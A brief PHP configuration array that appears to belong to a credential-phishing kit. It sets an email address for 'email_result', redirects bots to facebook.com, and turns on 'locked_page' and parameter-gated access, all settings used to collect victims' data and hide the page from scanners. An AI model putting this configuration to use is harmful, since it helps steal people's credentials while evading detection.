<?php return array (
  'email_result' => 'email@karma.shop',
  'parameter' => 'csx',
  'redirect_bots' => 'https://facebook.com',
  'email_akses_page' => 'on',
  'locked_page' => 'on',
);